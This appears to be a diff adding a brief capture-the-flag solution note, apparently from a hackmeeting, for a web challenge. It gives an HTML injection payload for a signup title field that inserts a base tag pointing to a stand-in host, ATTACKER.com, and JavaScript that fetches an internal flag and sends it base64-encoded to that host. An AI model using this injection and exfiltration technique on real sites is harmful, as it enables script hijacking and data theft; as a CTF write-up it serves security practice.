@@ -1,0 +1,7 @@
+# By Robin, together with polyg0ts during the hackmeeting :)
+Make the "title" field when signing up look like `</title><base href=http://ATTACKER.com/ /><title> pwned`.
+Host `/static/js/marked.min.js` on ATTACKER.com with this content:
+```js
+fetch("http://web:8080/flag").then(content => content.text()).then(content => fetch("/blah?" + btoa(content)));
+```
+and read off the flag from the base64 request sent to your server.
